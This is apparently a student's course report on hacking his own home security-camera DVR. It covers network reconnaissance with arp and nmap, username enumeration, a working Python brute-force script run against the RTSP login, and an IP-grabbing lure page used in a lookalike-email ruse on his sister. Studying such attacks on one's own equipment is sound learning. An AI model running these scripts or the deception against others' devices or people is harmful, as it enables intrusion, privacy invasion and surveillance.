# COMP6841: SAP - McHACK

Tom Bednarek (z5419069)

GitHub Repo: [https://github.com/meeistom/COMP6841-SAP](https://github.com/meeistom/COMP6841-SAP)

I have included this report in Markdown format in the GitHub repo. It will be formatted nicer there compared to this PDF document.

# Aim

The aim of this project is to remotely hack into my own houses security camera system. The hook for my project and the thought that originated this project is: “I want to be at Maccas and hack into my own cameras.”

# Research

This project can be split up into 2 main sections.

1. Local section – the process of me attempting to gain access to the cameras while I am on my home network
2. Remote section – the process of me attempting to gain access to my home network while I am not on it

## Local Section

I initially set out a personal challenge in this section where I didn’t want to search up any videos that explicitly told me how to hack into a camera as I thought that I wouldn’t learn as much since everything would be spelled out for me. I also already had a rough plan that I thought might work.

### Viewing Devices on Local Network

My first thought was to view the devices that were connected to my local network and find my camera’s from there.

After some research I found out there was a command called: `arp -a`

After running this command in a Window Terminal (Command Prompt), I get the following results:

```
Microsoft Windows [Version 10.0.22631.4169]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Tom>arp -a

Interface: 192.168.0.83 --- 0x6
  Internet Address      Physical Address      Type
  192.168.0.1           a4-91-b1-d6-f0-e6     dynamic
  192.168.0.74          d8-f3-bc-74-6a-7d     dynamic
  192.168.0.86          cc-d2-9b-aa-ce-70     dynamic
  192.168.0.129         bc-51-fe-26-45-f1     dynamic
  192.168.0.130         24-4b-03-d2-70-ac     dynamic
  192.168.0.133         a8-b1-3b-fc-92-29     dynamic
  192.168.0.134         1c-f2-9a-5a-8c-fc     dynamic
  192.168.0.205         d8-f3-bc-4c-0f-b3     dynamic
  192.168.0.225         d4-3b-04-2b-50-07     dynamic
  192.168.0.230         38-ba-f8-72-a0-f6     dynamic
  192.168.0.232         1c-f2-9a-1a-bf-bd     dynamic
  192.168.0.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.56.1 --- 0x11
  Internet Address      Physical Address      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 172.20.96.1 --- 0x2e
  Internet Address      Physical Address      Type
  172.20.111.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 172.21.192.1 --- 0x3d
  Internet Address      Physical Address      Type
  172.21.196.179        00-15-5d-8e-a0-35     dynamic
  172.21.207.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
```

I only know what a little bit of this meant so I did some research to find out what each part of this result means.

The command `arp` stands for ‘Address Resolution Protocol’, it is a method of translating the 32 bit IPv4 (IP, Internet Protocol) address into a 48 bit MAC (Media Access Control) address and vice versa. In the output shown, the `Physical Address` is a MAC address.

The `-a` part of the command displays the current ARP entries by interrogating the current protocol data. So it shows every IP and MAC address translation that is currently in use by the network.

Then taking a look at the next line: `Interface: 192.168.0.83 --- 0x6` the IP address here is the IP assigned to my network interfaces. This is because a device can have several network interfaces. Some examples include: Wi-Fi, Ethernet, Bluetooth a VPN (Virtual Private Network) or VM (Virtual Machine), even Docker. We can actually view each network interface if we use the `ipconfig` command and match the IP’s to the interface.

So `192.168.0.83` is my ‘Wireless LAN adapter Wi-Fi’ interface.

![image.png](image.png)

- My Public IPv6 address is shown under the red box

`192.168.56.1` is my ‘Ethernet adapter Ethernet 3’ interface.

![image.png](image%201.png)

`172.20.96.1` is my ‘Ethernet adapter vEthernet (Default Switch)` interface.

![image.png](image%202.png)

And finally `172.21.192.1` is my ‘Ethernet adapter vEthernet (WSL (Hyper-V firewall))’ interface.

![image.png](image%203.png)

The hex numbers that come after the interface IP: `0x6`, `0x11`, `0x2e` and `0x3d` are just numbers that my computer uses as an index/identifier for each interface.

Now let’s examine the next line: `Internet Address      Physical Address      Type`

- Internet Address → IPv4 address
- Physical Address → MAC address
- Type → Type of ARP cache table entry, there are only 2 possible values
    - *Static is manually configured and stays in the cache table permanently*
        - *It is ideal for device that regularly communicate with other devices on the same network*
    - *Dynamic entries are updated dynamically as devices communicate*
        - *Has a limited lifespan and auto refreshes based on ARP protocols*
    - (BasuMallick, 2023)

So let us now examine each of the IP types that show up. From my time in `COMP3331: Computer Networks and Applications` I learned that the first byte of the IPv4 address holds the most information about what type of address it is, so let’s use that to find out what type of address each of these are.

- 172 → Private IP address on a network
- 192 → Private IP address on a network
- 224 → Multicast address - an identifier for a group of hosts
    - Host → A computer or other device on a computer network that offers information, services or applications to other users on the network
- 239 → Multicast address
- 255 → Reserved for future use

### Getting Camera’s IP Address

So I had a few ideas after discovering this information about IP’s and types. I initially suspected that my cameras will most likely have a `224` or `239` multicast address since they provide information to other users on the network. But after looking at the types that each of those IP addresses had I realized that my hypothesis was incorrect since they were all static types.

My cameras were made by ‘Swann Security’ who have made an app that you can use to view the camera feed. This is accessible even when I am not on my local home network so the type would have to be dynamic since different devices can communicate with the cameras on a different network.

Since a `255` IP is useless, my IP would have to be a `172` or `192` IP address. This realization also made me realize that my cameras don’t communicate with the app directly, they are actually sent to digital video recorder (DVR) which communicates with the app and since my cameras are wired, they wouldn’t actually have an IP address, only the DVR would.

Since I have an app to access the cameras, then that must mean I can communicate with them over Wi-Fi, so that means it is an IP which belongs to my `192.168.0.83` Interface.

So I know that the IP belongs to my Wi-Fi interface, it starts with either: `172` or `192` and that it is a `dynamic` type. That narrows the possible IP addresses down to this range:

```
Internet Address      Physical Address      Type
192.168.0.1           a4-91-b1-d6-f0-e6     dynamic
192.168.0.74          d8-f3-bc-74-6a-7d     dynamic
192.168.0.86          cc-d2-9b-aa-ce-70     dynamic
192.168.0.129         bc-51-fe-26-45-f1     dynamic
192.168.0.130         24-4b-03-d2-70-ac     dynamic
192.168.0.133         a8-b1-3b-fc-92-29     dynamic
192.168.0.134         1c-f2-9a-5a-8c-fc     dynamic
192.168.0.205         d8-f3-bc-4c-0f-b3     dynamic
192.168.0.225         d4-3b-04-2b-50-07     dynamic
192.168.0.230         38-ba-f8-72-a0-f6     dynamic
192.168.0.232         1c-f2-9a-1a-bf-bd     dynamic
```

Now I will attempt to find out which device is assigned to which IP. I remember using a command in in `COMP3331` called `nslookup` which finds the hostname/IP address when give the other piece of information. So when I give it the hostname `google.com` it will give me `google.com`’s IP address, but when I give it `google.com`’s IP address, it will give me the nameserver that the IP runs on (It could be `google.com` but in reality it will be some obscure server name like the example below).

![image.png](image%204.png)

- My Public IPv6 address is shown under the red box

So I attempt to use this command for my target IP addresses. For the 1st IP address it returns me some useful information. I now know that the `192.168.0.1` address belongs to my modem. Since every Wi-Fi enabled device sends it’s data through the modem, if I can gain access to it I might be able to see the other devices on my network.

![image.png](image%205.png)

- My Public IPv6 address is shown under the red box

However, trying the `nslookup` command for the following IP’s yielded disappointing results:

![image.png](image%206.png)

So I went to my modem’s name server and was greeted with a webpage.

![image.png](image%207.png)

- The red boxes hide potentially identifiable information

So I can see a login section and I can see my modem’s model. So I look for the modem’s default username and password and find out that they are:

- Username: `admin`
- Password: `Telstra`

I input these details but I did not gain access to my modem, thus my Dad must have set up a password when he was configuring the network. I saw this as I point I couldn’t get past so I returned back to trying to find out information about the devices behind the IP addresses.

Since the ARP protocol translates a 48 bit MAC address into a 32 bit IP address, that must mean that the MAC addresses (or Physical Addresses) are linked to the device as well and should contain identifiable information.

This theory way correct as I discovered that the first 3 bytes of the MAC address actually link to the vendor/company that made the product. I then started inputting each of the MAC addresses from the `arp -a` into this website: [https://dnschecker.org/mac-lookup.php](https://dnschecker.org/mac-lookup.php?query=bc-51-fe-26-45-f1), which eventually produced the following result:

![image.png](image%208.png)

So these are the details of my security cameras DVR:

```
Internet Address      Physical Address      Type
192.168.0.129         bc-51-fe-26-45-f1     dynamic
```

### Accessing the Cameras

Once again, from my time in `COMP3331`, I remembered that devices communicate through ports. Some research revealed that I could use a tool called `nmap` to scan an IP address for open ports.

Since this is easily available on Linux through the `sudo apt install nmap` command, I opened an Ubuntu terminal in WSL 2 (Window’s Subsystem for Linux 2) and installed the tool.

I then ran the following command `nmap -p- 192.168.0.129` which scans the IP for every open port.

- `-p <port ranges>` specifies the ports to be scanned. Putting a `-` after the `-p` sets the port range to be from `0 - 65535` in other words, every single port.

This command resulted in the following:

![image.png](image%209.png)

- After running this command a few times over the span of this project I realized that the `48841` port would often change to a random 5 digit port, so I left it out of my investigations since I never used it

I now began my research on what each part of this result meant.

TCP → Transmission Control Protocol

- A method which uses a 3 way handshake, `SYN` → `SYN-ACK` → `ACK`, to initialize a connection between a server and client, ensuring that all data packets get sent pack and forth, in order and without losing and data packets

Ports:

- 85
    - It is a HTTP (Hypertext Transport Protocol) port, so I should be able to access this website via the internet
    - It is a system port which means that it is a well known port
    - mit-ml-dev
        - This port is associated with Massachusetts Institute of Technology’s (mit) early development (dev) in Machine Learning (ml)
        - In modern networking the port is often unused or repurposed (repurposed as a HTTP port in this case)
- 554
    - It is a RTSP (Real Time Streaming Protocol) port, I should also be able to access the cameras through this port, just not on the internet
    - It is a system port
- 9000
    - It is a user port, it is also known as a registered port
    - cslistener seems to normally be used for something called ‘Port Forwarding’
        - Port forwarding is an application of Network Address Translation (NAT), where data packets sent to one address and port are sent to another address and port when the data packets are travelling through a network gateway (E.g. Router or Firewall).
        - It is a method of exposing internal information, externally

**HTTP PORT: 85**

Since I am most familiar with the HTTP protocol I started my recon on port 85. I went to `http://192.168.0.129:85` on my browser and was greeted by this page:

![image.png](image%2010.png)

So I downloaded Firefox 50, went to the URL and was greeted by this page instead:

![image.png](image%2011.png)

Then I of course downloaded the plugin.

![image.png](image%2012.png)

After sorting out some Firefox auto update issues I kept on getting the `You haven't installed the plugin...` screen, even though I had followed all of this instructions and definitely had the plugin installed.

So instead I attempted to use the Internet Explorer and Google Chrome options. However my computer runs on Windows 11 and Internet Explorer 8 was made for Windows 7 so I could not get Internet Explorer 8 to work. Google Chrome 44 was also having some compatibility issues so I was not able to access the cameras through the HTTP port.

**RTSP PORT: 554**

I moved onto the RTSP port and discovered that you could watch RTSP streams through the VLC media player. You can connect by going to `Media > Open Network Stream` then inputting the network URL into the textbox.

![image.png](image%2013.png)

Some research revealed that the format for viewing a Swann Security camera is: `rtsp://192.168.0.129:554/ch01/0`. This mimics the websites URL, but the protocol and port number have been changed. When I accessed this URL I was then greeted by a pop-up requiring a username and password.

![image.png](image%2014.png)

I input `admin` as my username and password but was greeted by the same pop-up again, without receiving an error message. So to view the errors I opened up Wireshark and reattempted to connect to the cameras while the packet capture was ongoing. This is what Wireshark caught in between my computer and the camera’s when attempting to connect.

![image.png](image%2015.png)

Packet No. 1832 returning `400 Bad Request` implies that the username and password are not correct. Observing packet no. 1613 which returns `401 Unauthorized` makes me wonder if I could possible modify a packet as it is being sent, such that it gives me access to the cameras.

**CSLISTENER PORT: 9000**

Since this port is used for port forwarding it is used to establish a connection between a device outside of the network. Since I am currently inside my network, this port is useless for me.

**RTSP PORT: 554 - ROUND 2**

This time I attempt to connect to the cameras using a Python program, using the RTSP protocol again, with hopes that I will be able to avoid the username and password requirement somehow. I modify some responses from this StackOverflow question: [https://stackoverflow.com/questions/17961318/read-frames-from-rtsp-stream-in-python](https://stackoverflow.com/questions/17961318/read-frames-from-rtsp-stream-in-python) to create the following Python program:

```python
import vlc
import time
from urllib.parse import quote

def play_rtsp_stream(rtsp_url):
    # Create an instance of the VLC player
    instance = vlc.Instance()
    
    # Create a new media player
    player = instance.media_player_new()

    # Create a media object for the RTSP stream
    media = instance.media_new(rtsp_url)

    # Set the media for the player
    player.set_media(media)

    # Start playing the RTSP stream
    player.play()

    # Keep the script running to allow the player to keep playing
    while True:             
        state = player.get_state()
        if state == vlc.State.Ended:
            print("Stream has ended.")
            break
        elif state == vlc.State.Error:
            print("Error occurred.")
            break
        # Give some time for the media to load
        time.sleep(1)

if __name__ == "__main__":
		# Ensure the username and password doesn't mess up the url formatting
    username = quote('admin')
    password = quote('admin')

    rtsp_url = f"rtsp://{username}:{password}@192.168.0.129:554/ch01/0"
    
    # Start playing the stream
    play_rtsp_stream(rtsp_url)

```

However, this method still required me to know the username and password. The `quote()` function was added after I received the following error.

```
rtsp://username:password@192.168.0.129:554/ch01/0
[tcp @ 0000023488109a00] Port missing in uri
```

I was attempting to use an email as a password and discovered that the `@` symbol was messing with the URL and not allowing it.

At least now I have a way to interact with login page through Python, which means that I could brute force the login, if I really needed to.

**HTTP PORT: 85 - ROUND 2**

So I discovered that Microsoft Edge has a feature called ‘Internet Explorer compatibility’. You can see the default page for some websites to use Internet Explorer instead of Microsoft edge. So I added the webpage `http://192.168.0.129:85` to the compatibility mode and am now able to open up my cameras web interface.

![image.png](image%2016.png)

So this is the default login page and the username field comes already prefilled in with the `admin` value. Next I tested different values for the username and password to see if the error messages gave my any useful information.

- Username: `admin`, Password: empty → Error message: `Password cannot be empty!`
- Username `admin`, Password: `admin` → Error message: `Password Error!`
- Username `hello`, Password: empty → Error message: `Password cannot be empty!`
- Username `hello`, Password: `hello` → Error message: `Username Does Not Exist!`

So comparing messages 2 & 4, we can see that if a username is not registered in the system, the error message lets us know. But for message 2 it says that we have a password error when inputting an incorrect password. Thus we can infer that there is an account called `admin` registered on the cameras.

I tried briefly testing if there was an SQLi vulnerability by inputting the `'` and `"` characters into the text fields but I did not receive and strange errors. I did discover that very briefly the screen would show the message `Connecting...` when pressing the login button, but it was just for a few milliseconds.

Through my testing I also discovered that if I got the password wrong more than 5 times it would automatically kick me off the webpage. I’m hoping that if I need to brute force the password later on, which is now feasible since I have a username that I know works, this auto kick-off feature won’t get in my way.

![image.png](image%2017.png)

So I looked up the instruction manual for my DVR’s model and it said that there was no default password. When setting up the cameras you would have to input your own password.

### Brute Force Attack

For the sake of this assignment I changed the password on the cameras to be a very weak password: `qwerty1`. This is because I downloaded a text file from: [https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt](https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt) which contains the 1000 most common passwords and password number 600 is my password: `qwerty1`.

So I created a Python script which brute forced every password in this text file.

```python
import cv2
import time
from urllib.parse import quote # Makes sure special character don't interfere with the URL

password_path = '1000-most-common-passwords.txt'

# Read in passwords
with open(password_path, 'r') as f:
    passwords = f.read().strip().split('\n')

# Set up constants and flags
username = 'admin'
found = False
start =  time.time()

# Attempt every password
for password in passwords:
    print(f'Trying: {password}')

    # Try to connect to the URL
    cap = cv2.VideoCapture(f"rtsp://{username}:{quote(password)}@192.168.0.129:554/ch01/0")

    # Exit the loop if the connection was succesful
    if cap.isOpened():
        cap.release()
        found = True
        break
    
    # Release the capture and go to the next password
    cap.release()

# Print that you found it, with some stats
if found:
    print(f'Password found: `{password}`.', end= ' ')
else:
    print(f'Password not found.', end=' ')
print(f'Time elapsed: {round(time.time()-start, 2)} seconds.')
```

Running this code produced the following output:

```
Trying: 123456
[rtsp @ 000001f4a5f0c800] method DESCRIBE failed: 401 Unauthorized
Trying: password
[rtsp @ 000001f4a5f0d440] method DESCRIBE failed: 401 Unauthorized
Trying: 12345678
[rtsp @ 000001f4a5f0d440] method DESCRIBE failed: 401 Unauthorized
...
...
...
Trying: sabrina
[rtsp @ 000001f989f0d440] method DESCRIBE failed: 401 Unauthorized
Trying: horses
[rtsp @ 000001f989f0d440] method DESCRIBE failed: 401 Unauthorized
Trying: 0987654321
[rtsp @ 000001f989f0d440] method DESCRIBE failed: 401 Unauthorized
Trying: qwerty1
Password found: `qwerty1`. Time elapsed: 64.47 seconds.
```

So inputting these details into the webpage login fields

- Username: `admin`
- Password: `qweryt1`

And viewing channel 0 provides me with this view of my backyard.

![image.png](image%2018.png)

It is important to note that I changed my cameras original password to perform attack, but even if I hadn’t my methodology would have remained largely the same. Instead first I would have checked if my parents email had been in any known data breaches. Checking on [https://haveibeenpwned.com/](https://haveibeenpwned.com/) is a good place to start which revealed that my parents email had been in 2 data breaches.

![image.png](image%2019.png)

However this breaches don’t contain any useful password information.

1. Animal Jam - This was a game my sister used to play when she was younger so it would be her password and not one of my parents’.
2. Dymocks - This doesn’t include any passwords

Since this website isn’t expansive I would next try the ‘Rock You’ dataset which you can download from Kaggle here: [https://www.kaggle.com/datasets/bwandowando/original-rockyou2024-text-file-11-parts](https://www.kaggle.com/datasets/bwandowando/original-rockyou2024-text-file-11-parts).

This is an updated version of the original Rock You dataset which now contains 10 billion passwords. I would attempt each password in there to see if it matched the cameras password. Before doing this though I would make my Python script quicker as 64 seconds to attempt 600 passwords is not the fastest. I could also use multiple computers and make use of my computers GPU to speed up this process.

### The Refined Process

So these are the steps that I can undertake from scratch to find my cameras again.

1. Execute `arp -a` 
2. Only look at the IP’s in my Wi-Fi interface that are a `dynamic` type and whose IP starts with `172` or `192`
3. Search up each IP’s MAC address to find the security camera vendor
4. Scan for open ports on that IP
5. Go to the webpage for that IP and find out that an `admin` account exists
6. Brute force the password using a Python script
7. Find the password and login to view the cameras

## Remote Section

Now I must attempt to access my cameras from a remote network.

### Obtaining Public IP Address

My first thought was that I need my home network’s public IP address so that I can connect to it. So I started making a Python Flask website that would grab the IP of someone who visits them, then reroute them to a website of my choosing. Here is the code:

```python
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def get_ip():
    visitor_ip = request.remote_addr
    # Log IP address
    print(f'IP: {visitor_ip}')
    # Redirect visitor to the url, or https://google.com as a default
    return redirect(request.args.get('url', 'https://google.com'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

This code did work when running it locally.

So if I went to `http://192.168.0.83:5000` it would redirect me to `https://google.com`

If I went to `http://192.168.0.83:5000/?url=https://youtube.com` it would redirect me to `https://youtube.com`

And each time I visited it would also just log my private IP address.

```
IP: 192.168.0.83
192.168.0.83 - - [04/Nov/2024 15:13:30] "GET / HTTP/1.1" 302 -
IP: 192.168.0.83
192.168.0.83 - - [04/Nov/2024 15:15:52] "GET /?url=https://youtube.com HTTP/1.1" 302 -
```

So I started researching for website hosting services that would host my website for free and give me a free domain name or subdomain where I could upload my own HTML code, but there was no such website available.

I almost obtained a free domain from [https://www.freenom.com/en/index.html](https://www.freenom.com/en/index.html) which would give you a specific TLD (Top Level Domain), but unfortunately they were sued.

So I eventually remembered that I had hosted a website on GitHub pages before and looked into that option. Since GitHub was only hosting static pages I had to embed all of my code into an `index.html` file. The following is the code of my website.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <!-- Include EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init({publicKey: "RmFfdVvDpWrRq7RaQ"});
        })();
        function getRedirectUrl() {
            // Set a default URL if none provided
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('redirect') || 'https://google.com';
        }
    </script>
</head>
<body>
    <script>
        // Function to send the IP address via EmailJS
        function sendIpByEmail(ip) {
            emailjs.send("service_2hgg9ff", "template_6l8rwyd", {user_ip: ip})
            .then(response => {
                // Redirect after successful email
                window.location.href = getRedirectUrl();
            })
            .catch(error => console.error("Error sending IP:", error));
        }

        // Fetch the user's IP address using a public API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                // Send IP via email using EmailJS
                sendIpByEmail(data.ip);
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
</body>
</html>
```

Since I could not store the IP’s on the backend, I used a service called EmailJS that could send emails within HTML files. I was able to combine that with a public API to obtain the visitors IP address and send it in a template to my own email address.

![image.png](image%2020.png)

So the website URL works the same as the Python website but it is not available on the internet.

`https://meeistom.github.io/get-email-ip` will send me your IP address and redirect you to `https://google.com`

`https://meeistom.github.io/get-email-ip?redirect=https://youtube.com` will send me your IP address and redirect you to `https://youtube.com`

**The Attack**

So on the 31st of October 2024 at 11:50 am I made a new Google account with the email address: `tombednarekj@gmail.com` which is very similar to my normal email address `tomjbednarek@gmail.com`.

I then decided to send the email to my sister. This is because her emails is her full name, which is the easiest to guess compared to other users of my home network. My brother’s email includes his favourite number and my parents email does not include any name so it would be harder to obtain.

Then I sent her the following email at 11:52 am from the new account I made:

![image.png](image%2021.png)

- The red box hides an email address

7 minutes later at 11:59 am I had obtained my home networks public IP.

![image.png](image%2022.png)

- The red boxes hide an email address and my public IPv4 address

### Getting Open Ports

Since this is just another IP address I will have to again scan it for open ports that I could potentially connect to.

So I run `nmap 101.XXX.XXX.XXX` where the `X`'s are substituted with my public IP values and get the following result.

![image.png](image%2023.png)

- The red boxes hide my public IPv4 address

What immediately sticks out to me is that port 5900 is somewhat open (filtering) running a VNC service since VNC stands for Virtual Network Computing. This means that I could use a software to gain access to my home network.

However once again I did some research on each port and here is what I found.

Ports:

- 110
    - pop3 → Post Office Protocol
        - Sends unencrypted data and lets users receive email messages over the port. An email client and server communicate over the port.
- 135
    - msrpc → Remote Procedure Protocol
        - Used in client-server applications
- 445
    - microsoft-ds → Microsoft DS
        - It is a TCP port used for direct Microsoft Networking that bypassing the need for a NetBIOS layer
- 631
    - ipp → Internet Printing Protocol
        - Protocol that printer’s use to receive stuff over the internet
- 3389
    - ms-wbt-server → Microsoft WBT (Windows Based Terminal) Server
        - This port is also commonly used with RDP (Remote Desktop Protocol) to connect to a computer and have local permissions and capabilities
- 5900
    - vnc → Virtual Network Computing
        - A port made for remote access software to connect over

After this detailed look at the ports, `3389` and `5900` seem the most interesting to me. If my public IP has a Remote Desktop Connection open I could gain access to an actual computer and execute my local camera attack. However first I downloaded a VNC remote access software from: [https://www.realvnc.com/en/](https://www.realvnc.com/en/) and attempted to connect my IP address but I was only met with a timeout error.

![image.png](image%2024.png)

I didn’t expect to gain access to my network but I also expected to see a login page so this timeout error confused me. So I ran `nmap 101.XXX.XXX.XXX` again and got the following result.

![image.png](image%2025.png)

So I gave up on being able to break into my home network purely from the IP address.

### Cracking WPA2 Security

My next thought was that if I was an attacker, I could be outside my house, close enough to be in range of my modem’s signal and break into the network like that. I would then setup a server that I could connect to anytime I wanted.

I watched this YouTube video by David Bombal: [https://www.youtube.com/watch?v=WfYxrLaqlN8](https://www.youtube.com/watch?v=WfYxrLaqlN8) to figure out how to crack WPA2-Personal since that is the type of security that my home network uses.

![image.png](image%2026.png)

However the first step of installing Kali Linux ended up being a hurdle I could not overcome. Since I don’t have a USB network adapter I attempted to install Kali Linux on my computer so that I could dual boot, either into Windows 11 or Kali Linux. However I ended up having some non-free file issues coupled with graphical issues that wouldn’t let me gain access to the operating system even though I had reinstalled it 3 times and tried various fixes on the internet.

So I moved onto installing Kali Linux onto my laptop which is definitely the better idea since it is portable. However I could not create a disk partition for Kali Linux since I did not have enough room on my laptop. Even after resetting my laptop I had some issues with unmovable files that interfered with my ability to make a disk partition. Even after I reset my laptop again.

### How I would continue

This is where I stopped in my project since I ran out of time. However these are the steps I would take to complete the task I laid out for myself.

1. Get Kali Linux working on my computer
2. Follow the video guide by David Bombal to crack WPA2 security
3. Setup a server that I can connect to freely so I can access my home network
4. Go to Maccas and perform the attack

### Connecting with RDP

I did theorize how I could of connected to the cameras if port 3389 remained open and I was able to connect to it. I simply turned on Remote Desktop Connection on my computer, forwarded the port through my modem so that I could access it remotely, not just locally, then I went to Maccas and performed the ‘attack’

So here is an image of laptop screen while I am at Maccas connected to their wifi

![image.png](image%2027.png)

Here is some proof showing that IP address is different to my home networks IP address.

![image.png](image%2028.png)

And here is me at Maccas performing the attack.

![PXL_20241104_035022594_censored.jpg](PXL_20241104_035022594_censored.jpg)

# References

1. AuditMyPC. (n.d.). *TCP 85* [online] AuditMyPC. Available at: [https://www.auditmypc.com/tcp-port-85.asp](https://www.auditmypc.com/tcp-port-85.asp) [Accessed 12 October 2024].
2. BasuMallick, C. (2023). *What Is ARP? Working, Types, and Importance* [online] Spiceworks. Available at: [https://www.spiceworks.com/tech/networking/articles/what-is-arp/](https://www.spiceworks.com/tech/networking/articles/what-is-arp/) [Accessed 09 October 2024].
3. Bombal, D. (2021). *TCP Port Scanning* [online] YouTube. Available at: [https://www.youtube.com/watch?v=WfYxrLaqlN8](https://www.youtube.com/watch?v=WfYxrLaqlN8) [Accessed 03 November 2024].
4. Boylls, T. (2024). *How to See Who Is Connected to Your Wireless Network* [online] WikiHow. Available at: [https://www.wikihow.com/See-Who-Is-Connected-to-Your-Wireless-Network](https://www.wikihow.com/See-Who-Is-Connected-to-Your-Wireless-Network) [Accessed 09 October 2024].
5. Busch, Z. (2021). *What Is Port Forwarding? - A Beginner's Guide* [online] G2. Available at: [https://learn.g2.com/port-forwarding](https://learn.g2.com/port-forwarding) [Accessed 14 October 2024].
6. BwandoWando. (2024). *❗RockYou2024.txt| Original zip file* [online] Kaggle. Available at: [https://www.kaggle.com/datasets/bwandowando/original-rockyou2024-text-file-11-parts](https://www.kaggle.com/datasets/bwandowando/original-rockyou2024-text-file-11-parts) [Accessed 23 October 2024].
7. ChatGPT. (2024). *ARP Command Output Explanation* [online] ChatGPT. Available at: [https://chatgpt.com/share/6707df80-a078-8009-9949-2288499cb17a](https://chatgpt.com/share/6707df80-a078-8009-9949-2288499cb17a) [Accessed 11 October 2024].
8. ChatGPT. (2024). *Port 85 tcp mit-ml-dev* [online] ChatGPT. Available at: [https://chatgpt.com/share/670a49a7-8414-8009-9b40-07f8207f9b14](https://chatgpt.com/share/670a49a7-8414-8009-9b40-07f8207f9b14) [Accessed 12 October 2024].
9. Cohen, C. (2023). *What Is Port 110?* [online] CBT Nuggets. Available at: [https://www.cbtnuggets.com/common-ports/what-is-port-110](https://www.cbtnuggets.com/common-ports/what-is-port-110) [Accessed 25 October 2024].
10. [deleted]. (2021). *TCP scan detected on port 9000,how dangerous is this?* [online] Reddit. Available at: [https://www.reddit.com/r/HomeNetworking/comments/p0su76/tcp_scan_detected_on_port_9000how_dangerous_is/](https://www.reddit.com/r/HomeNetworking/comments/p0su76/tcp_scan_detected_on_port_9000how_dangerous_is/) [Accessed 12 October 2024].
11. DNS Checker. (n.d.). *MAC Address Lookup* [online] DNS Checker. Available at: [https://dnschecker.org/mac-lookup.php](https://dnschecker.org/mac-lookup.php) [Accessed 11 October 2024].
12. Fortinet. (n.d.). *What Is Address Resolution Protocol (ARP)?* [online] Fortinet. Available at: [https://www.fortinet.com/resources/cyberglossary/what-is-arp](https://www.fortinet.com/resources/cyberglossary/what-is-arp) [Accessed 09 October 2024].
13. HackTricks. (2024). *631 - Internet Printing Protocol(IPP)* [online] HackTricks. Available at: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp](https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp) [Accessed 25 October 2024].
14. Hanwha Vision. (2024). *Using VLC to View RTSP Streams from Devices* [online] Hanwha Vision. Available at: [https://support.hanwhavisionamerica.com/hc/en-us/articles/22959999056411-Using-VLC-to-view-RTSP-streams-from-Devices](https://support.hanwhavisionamerica.com/hc/en-us/articles/22959999056411-Using-VLC-to-view-RTSP-streams-from-Devices) [Accessed 12 October 2024].
15. haveibeenpwned. (n.d.). *';--have i been pwned?* [online] haveibeenpwned. Available at: [https://haveibeenpwned.com/](https://haveibeenpwned.com/) [Accessed 23 October 2024].
16. IANA. (2024). *Service Name and Transport Protocol Port Number Registry* [online] IANA. Available at: [https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) [Accessed 12 October 2024].
17. iSpyConnect. (n.d.). *Swann IP Camera Setup URL Guide* [online] iSpyConnect. Available at: [https://www.ispyconnect.com/camera/swann](https://www.ispyconnect.com/camera/swann) [Accessed 12 October 2024].
18. Mozilla. (n.d.). *400 Bad Request* [online] Mozilla. Available at: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/400](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/400) [Accessed 12 October 2024].
19. Nacimento, N. (2021). *cv2.videoCapture only return "Port missing in uri”* [online] Stack Overflow. Available at: [https://stackoverflow.com/questions/65833545/cv2-videocapture-only-return-port-missing-in-uri](https://stackoverflow.com/questions/65833545/cv2-videocapture-only-return-port-missing-in-uri) [Accessed 14 October 2024].
20. Ninov, R. (2023). *How to Find Open Port on Specific IP Address in Windows 10?* [online] Super User. Available at: [https://superuser.com/questions/1779547/how-to-find-open-port-on-specific-ip-address-in-windows-10](https://superuser.com/questions/1779547/how-to-find-open-port-on-specific-ip-address-in-windows-10) [Accessed 12 October 2024].
21. Saravanan, G. (2024). *How can you determine which device owns an IP address on your LAN (local area network) without pinging them all individually?* [online] Quora. Available at: [https://www.quora.com/How-can-you-determine-which-device-owns-an-IP-address-on-your-LAN-local-area-network-without-pinging-them-all-individually](https://www.quora.com/How-can-you-determine-which-device-owns-an-IP-address-on-your-LAN-local-area-network-without-pinging-them-all-individually) [Accessed 11 October 2024].
22. SpeedGuide. (n.d.). *Port 135 Details* [online] speed guide.net. Available at: [https://www.speedguide.net/port.php?port=135](https://www.speedguide.net/port.php?port=135) [Accessed 25 October 2024].
